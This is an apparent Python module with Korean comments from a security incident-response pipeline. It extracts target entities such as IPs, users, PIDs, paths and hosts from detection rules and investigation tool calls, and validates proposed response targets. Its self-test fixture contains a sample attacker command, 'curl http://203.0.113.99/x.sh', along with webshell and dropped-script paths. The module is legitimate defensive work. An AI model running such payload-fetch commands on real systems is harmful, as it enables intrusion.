"""조치 대상(엔티티) 추출 — 설계 문서 5절.

LLM 자연어(evidence_chain, final_verdict.summary/attack_type 등)에서는 절대
추출하지 않는다. 1차 탐지가 코드로 뽑은 initial_seed.detection.rules[].detail과
조사 에이전트가 실제로 조회에 쓴 tools_called[].input만 쓴다(5-1절 출처 우선순위).
"""

from __future__ import annotations

import os
import re
import sys
from dataclasses import dataclass
from typing import Any, Mapping, Optional

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from respond.contract import Contract  # noqa: E402

_IPV4 = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")

# fetch_audit_log에는 파일 경로 필터가 없다(5-3절) — path는 web/system 계층에서만 의미를 가진다.
_FILE_LAYERS = ("system",)

# 2026-10-07 — system 계층 detail.path를 무조건 격리 대상으로 믿으면 안 된다.
# audit_webshell_recon.yml 같은 exec 계열 룰은 "셸로 명령을 실행했다"를 잡는데, 이때
# detail.path는 웹셸 파일이 아니라 "실행된 인터프리터·도구 경로"(/bin/sh, /usr/bin/curl, /usr/bin/id 등)다.
# 이걸 그대로 격리하면 시스템이 깨진다(실측: INC-1e9dfef7·deb5e2fa·fd2e1dca, 팀원 이지원 보고).
# 완벽한 구분(실행 vs 파일쓰기)은 룰 schema 확장 전까지 불가능하므로, 시스템 바이너리 디렉터리의
# 경로는 file_path 후보에서 원천 배제한다. 반입 파일(/tmp/…)·웹셸(/var/www/…)만 격리 대상으로 남는다.
_SYSTEM_BIN_DIRS = ("/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/",
                    "/lib/", "/lib64/", "/usr/lib/", "/usr/libexec/")
_WEB_LAYERS = ("web",)

# 도구별로 "경로"가 어떤 의미인지 다르다(5-3절). fetch_audit_log 등 경로 의미가 없는 도구는
# 여기 없으므로 자동으로 무시된다.
_TOOL_PATH_KIND = {"fetch_web_log": "url_path"}
_TOOL_IP_KEYS = ("src_ip", "dst_ip", "ip")


@dataclass(frozen=True)
class Entity:
    kind: str       # "ip" | "file_path" | "url_path" | "user" | "pid" | "host"
    value: str
    source: str      # "seed_detail" | "seed_src_ip" | "seed_host" | "tool_input"


def _from_seed_detail(initial_seed: Mapping[str, Any]) -> list:
    entities: list = []
    detection = initial_seed.get("detection")
    if not isinstance(detection, Mapping):
        return entities
    rules = detection.get("rules")
    if not isinstance(rules, list):
        return entities

    for rule in rules:
        if not isinstance(rule, Mapping):
            continue
        layer = rule.get("layer")
        detail = rule.get("detail")
        if not isinstance(detail, Mapping):
            continue

        user = detail.get("user")
        if isinstance(user, str) and user:
            entities.append(Entity("user", user, "seed_detail"))

        pid = detail.get("pid")
        if isinstance(pid, int) and not isinstance(pid, bool):
            entities.append(Entity("pid", str(pid), "seed_detail"))

        path = detail.get("path")
        if isinstance(path, str) and path:
            if layer in _FILE_LAYERS:
                if not path.startswith(_SYSTEM_BIN_DIRS):   # 시스템 바이너리는 실행 도구지 반입 파일 아님
                    entities.append(Entity("file_path", path, "seed_detail"))
            elif layer in _WEB_LAYERS:
                entities.append(Entity("url_path", path, "seed_detail"))
            # auth 등 다른 계층의 path는 설계상 의미가 없어 추출하지 않는다(5-2절)

        exec_args = detail.get("exec_args")
        if isinstance(exec_args, str):
            match = _IPV4.search(exec_args)
            if match:
                entities.append(Entity("ip", match.group(0), "seed_detail"))

    return entities


def _from_seed_root(initial_seed: Mapping[str, Any]) -> list:
    entities: list = []
    src_ip = initial_seed.get("src_ip")
    if isinstance(src_ip, str) and src_ip:
        entities.append(Entity("ip", src_ip, "seed_src_ip"))
    host = initial_seed.get("host")
    if isinstance(host, str) and host:
        entities.append(Entity("host", host, "seed_host"))
    return entities


def _from_tools_called(tools_called: tuple) -> list:
    entities: list = []
    for call in tools_called:
        tool_name = call.get("tool_name")
        tool_input = call.get("input")
        if not isinstance(tool_input, Mapping):
            continue

        for key in _TOOL_IP_KEYS:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                entities.append(Entity("ip", value, "tool_input"))

        user = tool_input.get("user")
        if isinstance(user, str) and user:
            entities.append(Entity("user", user, "tool_input"))

        for key in ("pid", "ppid"):
            value = tool_input.get(key)
            if isinstance(value, int) and not isinstance(value, bool):
                entities.append(Entity("pid", str(value), "tool_input"))

        path = tool_input.get("path")
        if isinstance(path, str) and path:
            kind = _TOOL_PATH_KIND.get(tool_name)
            if kind:
                entities.append(Entity(kind, path, "tool_input"))

    return entities


def extract_entities(contract: Contract) -> tuple:
    """1순위(seed_detail/seed_src_ip/seed_host) 다음 2순위(tool_input) 순서로 모은다.

    같은 (kind, value)가 여러 출처에서 나오면 먼저 나온(더 신뢰도 높은) 것을 남긴다.
    """
    collected = (
        _from_seed_detail(contract.initial_seed)
        + _from_seed_root(contract.initial_seed)
        + _from_tools_called(contract.tools_called)
    )
    seen: dict = {}
    for entity in collected:
        key = (entity.kind, entity.value)
        if key not in seen:
            seen[key] = entity
    return tuple(seen.values())


def first_of_kind(entities: tuple, kind: str) -> Optional[Entity]:
    for entity in entities:
        if entity.kind == kind:
            return entity
    return None


# ↓ 2026-10-06 추가 — decide.py(조치 생성)와 select_gate.py(LLM 선택 검문) 둘 다
# "이 target이 실제 추출된 엔티티인가"를 같은 기준으로 봐야 한다. 정규식을 두 곳에
# 따로 두면 언젠가 어긋난다(선택 단계 통과했는데 작성 단계에서 막히는 식). 그래서
# 그 판단을 여기 한 곳에만 둔다 — decide.py의 first_of_kind()가 이미 하던 "kind별로
# 하나 고르기"와 같은 소스(entities 튜플)를 본다.

def entity_values_by_kind(entities: tuple) -> dict:
    """kind별 추출된 값 집합. {"ip": {"203.0.113.45"}, "user": {"www-data"}, ...}"""
    result: dict = {}
    for entity in entities:
        result.setdefault(entity.kind, set()).add(entity.value)
    return result


def allowed_target_values(entities: tuple) -> set:
    """kind를 안 가리는 전체 값 집합 — llm.py 7칸 작성 단계(규칙 7)가 쓰는 것과 같다."""
    return {entity.value for entity in entities}


def is_valid_target(entities: tuple, kind: Optional[str], value: str) -> bool:
    """value가 실제로 kind로 추출된 엔티티인가. select_gate.py가 이걸로 target을 검증한다.

    kind가 None인 템플릿(대상이 필요 없는 점검 항목)에는 이 함수를 쓰지 않는다 —
    그런 템플릿은 애초에 target이 없다.
    """
    if not kind:
        return False
    return value in entity_values_by_kind(entities).get(kind, set())


if __name__ == "__main__":  # 자체 점검: python llm/respond/entities.py
    from respond.contract import MappingView, Verdict

    contract = Contract(
        incident_id="INC-1", incident_key=None, investigation_id="INV-1",
        investigation_status="COMPLETE", provenance_status="passed",
        verdict=Verdict("THREAT_CONFIRMED", 0.8, "HIGH", "x", (), ""),
        investigation_confidence=0.9, remaining_unknowns=(), tools_called=(
            {"tool_name": "fetch_web_log", "input": {"src_ip": "198.51.100.9", "path": "/login"}},
        ),
        initial_seed={
            "src_ip": "203.0.113.45", "host": "web-01",
            "detection": {"rules": [
                {"layer": "system", "detail": {"user": "www-data", "pid": 2051,
                                                "path": "/var/www/html/.cache/x.sh",
                                                "exec_args": "curl http://203.0.113.99/x.sh"}},
                {"layer": "web", "detail": {"path": "/wp-content/uploads/shell.php"}},
                {"layer": "auth", "detail": {"path": "/should/not/be/used"}},
            ]},
        },
        mapping=MappingView("mapped", "passed", (), (), ()),
    )

    entities = extract_entities(contract)
    kinds = {(e.kind, e.value) for e in entities}

    assert ("ip", "203.0.113.45") in kinds          # seed_src_ip
    assert ("host", "web-01") in kinds              # seed_host
    assert ("user", "www-data") in kinds            # seed_detail
    assert ("pid", "2051") in kinds                 # seed_detail
    assert ("file_path", "/var/www/html/.cache/x.sh") in kinds   # system layer → 파일 경로
    assert ("url_path", "/wp-content/uploads/shell.php") in kinds  # web layer → URL
    assert ("file_path", "/wp-content/uploads/shell.php") not in kinds  # web path는 파일 격리 대상 아님
    assert ("ip", "203.0.113.99") in kinds           # exec_args에서 뽑은 외부 IP
    assert not any(e.value == "/should/not/be/used" for e in entities)  # auth 계층 path는 버림
    assert ("ip", "198.51.100.9") in kinds           # tools_called[].input
    assert ("url_path", "/login") in kinds           # fetch_web_log의 path는 URL

    # 2026-10-06 추가 — select_gate.py가 쓰는 공용 검증 함수
    by_kind = entity_values_by_kind(entities)
    assert by_kind["ip"] == {"203.0.113.45", "198.51.100.9", "203.0.113.99"}
    assert is_valid_target(entities, "ip", "203.0.113.45") is True
    assert is_valid_target(entities, "ip", "198.51.100.1") is False       # 추출되지 않은 IP
    assert is_valid_target(entities, "file_path", "/var/www/html/.cache/x.sh") is True
    assert is_valid_target(entities, "url_path", "/var/www/html/.cache/x.sh") is False  # kind가 다름
    assert is_valid_target(entities, None, "/login") is False             # 대상 없는 템플릿
    assert allowed_target_values(entities) >= {"203.0.113.45", "www-data"}

    # 수집 순서상 seed_detail(exec_args의 IP)이 seed_src_ip보다 먼저 나온다
    assert first_of_kind(entities, "ip").value == "203.0.113.99"
    print("ok")
